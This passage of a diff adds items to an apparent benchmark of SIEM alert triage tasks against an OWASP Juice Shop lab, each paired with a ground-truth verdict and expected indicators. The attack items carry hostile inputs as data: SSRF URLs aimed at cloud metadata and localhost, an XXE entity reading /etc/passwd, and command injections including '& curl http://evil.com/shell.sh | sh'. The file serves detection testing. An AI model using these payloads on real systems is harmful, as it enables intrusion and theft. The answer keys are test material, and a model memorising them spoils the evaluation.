+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_SSRF_aws-metadata",
+        "timestamp": "2026-03-21T14:37:29Z",
+        "raw_log": "POST /profile/image/url HTTP/1.1 | Status: 302 | Body: Found. Redirecting to /profile"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "169.254.169.254",
+          "meta-data"
+        ],
+        "risk_range": [
+          75,
+          100
+        ],
+        "attack_type": "ssrf",
+        "difficulty": "hard"
+      }
+    },
+    {
+      "id": 58,
+      "task_type": "data_exfiltration",
+      "severity": "critical",
+      "prompt": "Investigate SSRF attempt — profile image URL set to http://[::1]:3001/api/Users",
+      "siem_event": {
+        "title": "WAF_SSRF_ipv6-localhost",
+        "source_ip": "10.0.1.51",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_SSRF_ipv6-localhost",
+        "timestamp": "2026-03-21T14:37:29Z",
+        "raw_log": "POST /profile/image/url HTTP/1.1 | Status: 302 | Body: Found. Redirecting to /profile"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "::1"
+        ],
+        "risk_range": [
+          75,
+          100
+        ],
+        "attack_type": "ssrf",
+        "difficulty": "hard"
+      }
+    },
+    {
+      "id": 59,
+      "task_type": "data_exfiltration",
+      "severity": "critical",
+      "prompt": "Investigate SSRF attempt — profile image URL set to http://127.0.0.1:3001/rest/admin/application-confi",
+      "siem_event": {
+        "title": "WAF_SSRF_admin-config",
+        "source_ip": "10.0.2.101",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_SSRF_admin-config",
+        "timestamp": "2026-03-21T14:37:29Z",
+        "raw_log": "POST /profile/image/url HTTP/1.1 | Status: 302 | Body: Found. Redirecting to /profile"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "127.0.0.1",
+          "application-configuration"
+        ],
+        "risk_range": [
+          75,
+          100
+        ],
+        "attack_type": "ssrf",
+        "difficulty": "hard"
+      }
+    },
+    {
+      "id": 60,
+      "task_type": "data_exfiltration",
+      "severity": "critical",
+      "prompt": "Investigate SSRF attempt — profile image URL set to http://0x7f000001:3001/",
+      "siem_event": {
+        "title": "WAF_SSRF_hex-localhost",
+        "source_ip": "10.0.2.101",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_SSRF_hex-localhost",
+        "timestamp": "2026-03-21T14:37:29Z",
+        "raw_log": "POST /profile/image/url HTTP/1.1 | Status: 302 | Body: Found. Redirecting to /profile"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "0x7f000001"
+        ],
+        "risk_range": [
+          75,
+          100
+        ],
+        "attack_type": "ssrf",
+        "difficulty": "hard"
+      }
+    },
+    {
+      "id": 61,
+      "task_type": "malware",
+      "severity": "critical",
+      "prompt": "Investigate malicious file upload: malware.exe",
+      "siem_event": {
+        "title": "WAF_FileUpload_exe-upload",
+        "source_ip": "10.0.1.50",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_FileUpload_exe-upload",
+        "timestamp": "2026-03-21T14:37:30Z",
+        "raw_log": "POST /file-upload HTTP/1.1 | Status: 204 | Body: "
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "malware.exe",
+          "MZ header"
+        ],
+        "risk_range": [
+          70,
+          100
+        ],
+        "attack_type": "file_upload",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 62,
+      "task_type": "malware",
+      "severity": "critical",
+      "prompt": "Investigate malicious file upload: shell.php",
+      "siem_event": {
+        "title": "WAF_FileUpload_php-webshell",
+        "source_ip": "10.0.4.20",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_FileUpload_php-webshell",
+        "timestamp": "2026-03-21T14:37:30Z",
+        "raw_log": "POST /file-upload HTTP/1.1 | Status: 204 | Body: "
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "shell.php",
+          "system()"
+        ],
+        "risk_range": [
+          70,
+          100
+        ],
+        "attack_type": "file_upload",
+        "difficulty": "medium"
+      }
+    },
+    {
+      "id": 63,
+      "task_type": "malware",
+      "severity": "critical",
+      "prompt": "Investigate malicious file upload: xxe.xml",
+      "siem_event": {
+        "title": "WAF_FileUpload_xxe-injection",
+        "source_ip": "10.0.3.16",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_FileUpload_xxe-injection",
+        "timestamp": "2026-03-21T14:37:30Z",
+        "raw_log": "POST /file-upload HTTP/1.1 | Status: 410 | Body: <html>   <head>     <meta charset='utf-8'>      <title>Error: B2B customer complaints via file upload have been deprecated for security reasons: &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;foo&gt;"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "xxe.xml",
+          "/etc/passwd",
+          "ENTITY"
+        ],
+        "risk_range": [
+          70,
+          100
+        ],
+        "attack_type": "file_upload",
+        "difficulty": "hard"
+      }
+    },
+    {
+      "id": 64,
+      "task_type": "malware",
+      "severity": "critical",
+      "prompt": "Investigate malicious file upload: polyglot.jpg",
+      "siem_event": {
+        "title": "WAF_FileUpload_polyglot-xss",
+        "source_ip": "10.0.3.16",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_FileUpload_polyglot-xss",
+        "timestamp": "2026-03-21T14:37:30Z",
+        "raw_log": "POST /file-upload HTTP/1.1 | Status: 204 | Body: "
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "polyglot.jpg",
+          "<script>"
+        ],
+        "risk_range": [
+          70,
+          100
+        ],
+        "attack_type": "file_upload",
+        "difficulty": "hard"
+      }
+    },
+    {
+      "id": 65,
+      "task_type": "malware",
+      "severity": "critical",
+      "prompt": "Investigate malicious file upload: reverse_shell.py",
+      "siem_event": {
+        "title": "WAF_FileUpload_reverse-shell",
+        "source_ip": "10.0.4.20",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_FileUpload_reverse-shell",
+        "timestamp": "2026-03-21T14:37:30Z",
+        "raw_log": "POST /file-upload HTTP/1.1 | Status: 204 | Body: "
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "reverse_shell.py",
+          "socket.connect",
+          "4444"
+        ],
+        "risk_range": [
+          70,
+          100
+        ],
+        "attack_type": "file_upload",
+        "difficulty": "medium"
+      }
+    },
+    {
+      "id": 66,
+      "task_type": "malware",
+      "severity": "critical",
+      "prompt": "Investigate command injection attempt: ; ls -la /",
+      "siem_event": {
+        "title": "WAF_CmdInjection_semicolon-ls",
+        "source_ip": "10.0.2.100",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_CmdInjection_semicolon-ls",
+        "timestamp": "2026-03-21T14:37:30Z",
+        "raw_log": "POST /profile HTTP/1.1 | Status: 500 | Body: <html>   <head>     <meta charset='utf-8'>      <title>Error: Blocked illegal activity by ::ffff:172.20.0.1</title>     <style>* {   margin: 0;   padding: 0;   outline: 0; }  body {   padding: 80px 100px;   font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";   background: #ECE9E9 -webkit-gradient"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "; ls",
+          "command injection"
+        ],
+        "risk_range": [
+          80,
+          100
+        ],
+        "attack_type": "command_injection",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 67,
+      "task_type": "malware",
+      "severity": "critical",
+      "prompt": "Investigate command injection attempt: | cat /etc/passwd",
+      "siem_event": {
+        "title": "WAF_CmdInjection_pipe-cat-passwd",
+        "source_ip": "10.0.2.101",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_CmdInjection_pipe-cat-passwd",
+        "timestamp": "2026-03-21T14:37:30Z",
+        "raw_log": "POST /profile HTTP/1.1 | Status: 500 | Body: <html>   <head>     <meta charset='utf-8'>      <title>Error: Blocked illegal activity by ::ffff:172.20.0.1</title>     <style>* {   margin: 0;   padding: 0;   outline: 0; }  body {   padding: 80px 100px;   font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";   background: #ECE9E9 -webkit-gradient"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "| cat",
+          "/etc/passwd"
+        ],
+        "risk_range": [
+          80,
+          100
+        ],
+        "attack_type": "command_injection",
+        "difficulty": "medium"
+      }
+    },
+    {
+      "id": 68,
+      "task_type": "malware",
+      "severity": "critical",
+      "prompt": "Investigate command injection attempt: $(whoami)",
+      "siem_event": {
+        "title": "WAF_CmdInjection_dollar-whoami",
+        "source_ip": "10.0.4.21",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_CmdInjection_dollar-whoami",
+        "timestamp": "2026-03-21T14:37:30Z",
+        "raw_log": "POST /profile HTTP/1.1 | Status: 500 | Body: <html>   <head>     <meta charset='utf-8'>      <title>Error: Blocked illegal activity by ::ffff:172.20.0.1</title>     <style>* {   margin: 0;   padding: 0;   outline: 0; }  body {   padding: 80px 100px;   font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";   background: #ECE9E9 -webkit-gradient"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "$(whoami)",
+          "command substitution"
+        ],
+        "risk_range": [
+          80,
+          100
+        ],
+        "attack_type": "command_injection",
+        "difficulty": "medium"
+      }
+    },
+    {
+      "id": 69,
+      "task_type": "malware",
+      "severity": "critical",
+      "prompt": "Investigate command injection attempt: `id`",
+      "siem_event": {
+        "title": "WAF_CmdInjection_backtick-id",
+        "source_ip": "10.0.1.50",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_CmdInjection_backtick-id",
+        "timestamp": "2026-03-21T14:37:30Z",
+        "raw_log": "POST /profile HTTP/1.1 | Status: 500 | Body: <html>   <head>     <meta charset='utf-8'>      <title>Error: Blocked illegal activity by ::ffff:172.20.0.1</title>     <style>* {   margin: 0;   padding: 0;   outline: 0; }  body {   padding: 80px 100px;   font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";   background: #ECE9E9 -webkit-gradient"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "`id`",
+          "command injection"
+        ],
+        "risk_range": [
+          80,
+          100
+        ],
+        "attack_type": "command_injection",
+        "difficulty": "medium"
+      }
+    },
+    {
+      "id": 70,
+      "task_type": "malware",
+      "severity": "critical",
+      "prompt": "Investigate command injection attempt: & curl http://evil.com/shell.sh | sh",
+      "siem_event": {
+        "title": "WAF_CmdInjection_curl-pipe-sh",
+        "source_ip": "10.0.4.21",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_CmdInjection_curl-pipe-sh",
+        "timestamp": "2026-03-21T14:37:30Z",
+        "raw_log": "POST /profile HTTP/1.1 | Status: 500 | Body: <html>   <head>     <meta charset='utf-8'>      <title>Error: Blocked illegal activity by ::ffff:172.20.0.1</title>     <style>* {   margin: 0;   padding: 0;   outline: 0; }  body {   padding: 80px 100px;   font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";   background: #ECE9E9 -webkit-gradient"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "curl",
+          "evil.com",
+          "| sh"
+        ],
+        "risk_range": [
+          80,
+          100
+        ],
+        "attack_type": "command_injection",
+        "difficulty": "hard"
+      }
+    },
+    {
+      "id": 71,
+      "task_type": "benign_activity",
+      "severity": "low",
+      "prompt": "Review login attempt from customer1@juice-sh.op",
+      "siem_event": {
+        "title": "AUTH_Login_customer1",
+        "source_ip": "10.0.10.16",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "customer1",
+        "rule_name": "AUTH_Login_customer1",
+        "timestamp": "2026-03-21T14:37:30Z",
+        "raw_log": "POST /rest/user/login HTTP/1.1 | Status: 401 | Body: Invalid email or password."
+      },
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          20
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 72,
+      "task_type": "benign_activity",
+      "severity": "low",
+      "prompt": "Review login attempt from customer2@juice-sh.op",
+      "siem_event": {
+        "title": "AUTH_Login_customer2",
+        "source_ip": "10.0.10.13",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "customer2",
+        "rule_name": "AUTH_Login_customer2",
+        "timestamp": "2026-03-21T14:37:30Z",
+        "raw_log": "POST /rest/user/login HTTP/1.1 | Status: 401 | Body: Invalid email or password."
+      },
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          20
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 73,
+      "task_type": "benign_activity",
+      "severity": "low",
+      "prompt": "Review login attempt from john@juice-sh.op",
+      "siem_event": {
+        "title": "AUTH_Login_john",
+        "source_ip": "10.0.10.10",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "john",
+        "rule_name": "AUTH_Login_john",
+        "timestamp": "2026-03-21T14:37:30Z",
+        "raw_log": "POST /rest/user/login HTTP/1.1 | Status: 401 | Body: Invalid email or password."
+      },
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          20
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 74,
+      "task_type": "benign_activity",
+      "severity": "low",
+      "prompt": "Review login attempt from emma@juice-sh.op",
+      "siem_event": {
+        "title": "AUTH_Login_emma",
+        "source_ip": "10.0.10.10",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "emma",
+        "rule_name": "AUTH_Login_emma",
+        "timestamp": "2026-03-21T14:37:30Z",
+        "raw_log": "POST /rest/user/login HTTP/1.1 | Status: 401 | Body: Invalid email or password."
+      },
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          20
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 75,
+      "task_type": "benign_activity",
+      "severity": "low",
+      "prompt": "Review login attempt from support@juice-sh.op",
+      "siem_event": {
+        "title": "AUTH_Login_support",
+        "source_ip": "10.0.10.15",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "support",
+        "rule_name": "AUTH_Login_support",
+        "timestamp": "2026-03-21T14:37:30Z",
+        "raw_log": "POST /rest/user/login HTTP/1.1 | Status: 401 | Body: Invalid email or password."
+      },
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          20
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 76,
+      "task_type": "benign_activity",
+      "severity": "low",
+      "prompt": "Review login attempt from demo@juice-sh.op",
+      "siem_event": {
+        "title": "AUTH_Login_demo",
+        "source_ip": "10.0.10.10",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "demo",
+        "rule_name": "AUTH_Login_demo",
+        "timestamp": "2026-03-21T14:37:30Z",
+        "raw_log": "POST /rest/user/login HTTP/1.1 | Status: 401 | Body: Invalid email or password."
+      },
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          20
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 77,
+      "task_type": "benign_activity",
+      "severity": "low",
+      "prompt": "Review login attempt from test@juice-sh.op",
+      "siem_event": {
+        "title": "AUTH_Login_test",
+        "source_ip": "10.0.10.10",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "test",
+        "rule_name": "AUTH_Login_test",
+        "timestamp": "2026-03-21T14:37:31Z",
+        "raw_log": "POST /rest/user/login HTTP/1.1 | Status: 401 | Body: Invalid email or password."
+      },
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          20
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 78,
+      "task_type": "benign_activity",
+      "severity": "low",
+      "prompt": "Review login attempt from user1@juice-sh.op",
+      "siem_event": {
+        "title": "AUTH_Login_user1",
+        "source_ip": "10.0.10.14",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "user1",
+        "rule_name": "AUTH_Login_user1",
+        "timestamp": "2026-03-21T14:37:31Z",
+        "raw_log": "POST /rest/user/login HTTP/1.1 | Status: 401 | Body: Invalid email or password."
+      },
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          20
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 79,
+      "task_type": "benign_activity",
+      "severity": "low",
+      "prompt": "Review login attempt from user2@juice-sh.op",
+      "siem_event": {
+        "title": "AUTH_Login_user2",
+        "source_ip": "10.0.10.15",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "user2",
+        "rule_name": "AUTH_Login_user2",
+        "timestamp": "2026-03-21T14:37:31Z",
+        "raw_log": "POST /rest/user/login HTTP/1.1 | Status: 401 | Body: Invalid email or password."
+      },
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          20
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 80,
+      "task_type": "benign_activity",
+      "severity": "low",
+      "prompt": "Review login attempt from viewer@juice-sh.op",
+      "siem_event": {
+        "title": "AUTH_Login_viewer",
+        "source_ip": "10.0.10.15",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "viewer",
+        "rule_name": "AUTH_Login_viewer",
+        "timestamp": "2026-03-21T14:37:31Z",
+        "raw_log": "POST /rest/user/login HTTP/1.1 | Status: 401 | Body: Invalid email or password."
+      },
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          20
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 81,
+      "task_type": "benign_activity",
+      "severity": "low",
+      "prompt": "Review product search for 'apple'",
+      "siem_event": {
+        "title": "APP_ProductSearch_apple",
+        "source_ip": "10.0.10.16",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "customer",
+        "rule_name": "APP_ProductSearch_apple",
+        "timestamp": "2026-03-21T14:37:31Z",
+        "raw_log": "GET /rest/products/search?q=apple HTTP/1.1 | Status: 200 | Body: {\"status\":\"success\",\"data\":[{\"id\":1,\"name\":\"Apple Juice (1000ml)\",\"description\":\"The all-time classic.\",\"price\":1.99,\"deluxePrice\":0.99,\"image\":\"apple_juice.jpg\",\"createdAt\":\"2026-03-21 14:32:44.317 +00:00\",\"updatedAt\":\"2026-03-21 14:32:44.317 +00:00\",\"deletedAt\":null},{\"id\":24,\"name\":\"Apple Pomace\""
+      },
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          10
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 82,
+      "task_type": "benign_activity",
+      "severity": "low",
+      "prompt": "Review product search for 'juice'",
+      "siem_event": {
+        "title": "APP_ProductSearch_juice",
+        "source_ip": "10.0.10.12",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "customer",
+        "rule_name": "APP_ProductSearch_juice",
+        "timestamp": "2026-03-21T14:37:31Z",
+        "raw_log": "GET /rest/products/search?q=juice HTTP/1.1 | Status: 200 | Body: {\"status\":\"success\",\"data\":[{\"id\":1,\"name\":\"Apple Juice (1000ml)\",\"description\":\"The all-time classic.\",\"price\":1.99,\"deluxePrice\":0.99,\"image\":\"apple_juice.jpg\",\"createdAt\":\"2026-03-21 14:32:44.317 +00:00\",\"updatedAt\":\"2026-03-21 14:32:44.317 +00:00\",\"deletedAt\":null},{\"id\":6,\"name\":\"Banana Juice ("
+      },
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          10
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 83,
+      "task_type": "benign_activity",
+      "severity": "low",
+      "prompt": "Review product search for 'water'",
+      "siem_event": {
+        "title": "APP_ProductSearch_water",
+        "source_ip": "10.0.10.10",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "customer",
+        "rule_name": "APP_ProductSearch_water",
+        "timestamp": "2026-03-21T14:37:31Z",
+        "raw_log": "GET /rest/products/search?q=water HTTP/1.1 | Status: 200 | Body: {\"status\":\"success\",\"data\":[{\"id\":33,\"name\":\"Melon Bike (Comeback-Product 2018 Edition)\",\"description\":\"The wheels of this bicycle are made from real water melons. You might not want to ride it up/down the curb too hard.\",\"price\":2999,\"deluxePrice\":2999,\"image\":\"melon_bike.jpeg\",\"createdAt\":\"2026-03"
+      },
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          10
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 84,
+      "task_type": "benign_activity",
+      "severity": "low",
+      "prompt": "Review product search for 'banana'",
+      "siem_event": {
+        "title": "APP_ProductSearch_banana",
+        "source_ip": "10.0.10.16",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "customer",
+        "rule_name": "APP_ProductSearch_banana",
+        "timestamp": "2026-03-21T14:37:31Z",
+        "raw_log": "GET /rest/products/search?q=banana HTTP/1.1 | Status: 200 | Body: {\"status\":\"success\",\"data\":[{\"id\":6,\"name\":\"Banana Juice (1000ml)\",\"description\":\"Monkeys love it the most.\",\"price\":1.99,\"deluxePrice\":1.99,\"image\":\"banana_juice.jpg\",\"createdAt\":\"2026-03-21 14:32:44.317 +00:00\",\"updatedAt\":\"2026-03-21 14:32:44.317 +00:00\",\"deletedAt\":null}]}"
+      },
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          10
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 85,
+      "task_type": "benign_activity",
+      "severity": "low",
+      "prompt": "Review product search for 'lemon'",
+      "siem_event": {
+        "title": "APP_ProductSearch_lemon",
+        "source_ip": "10.0.10.10",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "customer",
+        "rule_name": "APP_ProductSearch_lemon",
+        "timestamp": "2026-03-21T14:37:31Z",
+        "raw_log": "GET /rest/products/search?q=lemon HTTP/1.1 | Status: 200 | Body: {\"status\":\"success\",\"data\":[{\"id\":5,\"name\":\"Lemon Juice (500ml)\",\"description\":\"Sour but full of vitamins.\",\"price\":2.99,\"deluxePrice\":1.99,\"image\":\"lemon_juice.jpg\",\"createdAt\":\"2026-03-21 14:32:44.317 +00:00\",\"updatedAt\":\"2026-03-21 14:32:44.317 +00:00\",\"deletedAt\":null}]}"
+      },
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          10
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 86,
+      "task_type": "benign_activity",
+      "severity": "low",
+      "prompt": "Review product search for 'orange'",
+      "siem_event": {
+        "title": "APP_ProductSearch_orange",
+        "source_ip": "10.0.10.10",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "customer",
+        "rule_name": "APP_ProductSearch_orange",
+        "timestamp": "2026-03-21T14:37:31Z",
+        "raw_log": "GET /rest/products/search?q=orange HTTP/1.1 | Status: 200 | Body: {\"status\":\"success\",\"data\":[{\"id\":2,\"name\":\"Orange Juice (1000ml)\",\"description\":\"Made from oranges hand-picked by Uncle Dittmeyer.\",\"price\":2.99,\"deluxePrice\":2.49,\"image\":\"orange_juice.jpg\",\"createdAt\":\"2026-03-21 14:32:44.317 +00:00\",\"updatedAt\":\"2026-03-21 14:32:44.317 +00:00\",\"deletedAt\":null}]"
+      },
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          10
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 87,
+      "task_type": "benign_activity",
+      "severity": "low",
+      "prompt": "Review product search for 'salad'",
+      "siem_event": {
+        "title": "APP_ProductSearch_salad",
+        "source_ip": "10.0.10.15",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "customer",
+        "rule_name": "APP_ProductSearch_salad",
+        "timestamp": "2026-03-21T14:37:31Z",
+        "raw_log": "GET /rest/products/search?q=salad HTTP/1.1 | Status: 200 | Body: {\"status\":\"success\",\"data\":[]}"
+      },
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          10
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 88,
+      "task_type": "benign_activity",
+      "severity": "low",
+      "prompt": "Review product search for 'melon'",
+      "siem_event": {
+        "title": "APP_ProductSearch_melon",
+        "source_ip": "10.0.10.11",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "customer",
+        "rule_name": "APP_ProductSearch_melon",
+        "timestamp": "2026-03-21T14:37:31Z",
+        "raw_log": "GET /rest/products/search?q=melon HTTP/1.1 | Status: 200 | Body: {\"status\":\"success\",\"data\":[{\"id\":33,\"name\":\"Melon Bike (Comeback-Product 2018 Edition)\",\"description\":\"The wheels of this bicycle are made from real water melons. You might not want to ride it up/down the curb too hard.\",\"price\":2999,\"deluxePrice\":2999,\"image\":\"melon_bike.jpeg\",\"createdAt\":\"2026-03"
+      },
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          10
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 89,
+      "task_type": "benign_activity",
+      "severity": "low",
+      "prompt": "Review product search for 'smoothie'",
+      "siem_event": {
+        "title": "APP_ProductSearch_smoothie",
+        "source_ip": "10.0.10.16",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "customer",
+        "rule_name": "APP_ProductSearch_smoothie",
+        "timestamp": "2026-03-21T14:37:31Z",
+        "raw_log": "GET /rest/products/search?q=smoothie HTTP/1.1 | Status: 200 | Body: {\"status\":\"success\",\"data\":[{\"id\":22,\"name\":\"Green Smoothie\",\"description\":\"Looks poisonous but is actually very good for your health! Made from green cabbage, spinach, kiwi and grass.\",\"price\":1.99,\"deluxePrice\":1.99,\"image\":\"green_smoothie.jpg\",\"createdAt\":\"2026-03-21 14:32:44.319 +00:00\",\"updated"
+      },
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          10
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 90,
+      "task_type": "benign_activity",
+      "severity": "low",
+      "prompt": "Review product search for 'tea'",
+      "siem_event": {
+        "title": "APP_ProductSearch_tea",
+        "source_ip": "10.0.10.15",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "customer",
+        "rule_name": "APP_ProductSearch_tea",
+        "timestamp": "2026-03-21T14:37:31Z",
+        "raw_log": "GET /rest/products/search?q=tea HTTP/1.1 | Status: 200 | Body: {\"status\":\"success\",\"data\":[{\"id\":42,\"name\":\"Best Juice Shop Salesman Artwork\",\"description\":\"Unique digital painting depicting Stan, our most qualified and almost profitable salesman. He made a succesful carreer in selling used ships, coffins, krypts, crosses, real estate, life insurance, restauran"
+      },
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          10
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 91,
+      "task_type": "benign_activity",
+      "severity": "low",
+      "prompt": "Review normal API call to /api/Products/1",
+      "siem_event": {
+        "title": "APP_API_product-detail-1",
+        "source_ip": "10.0.10.10",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
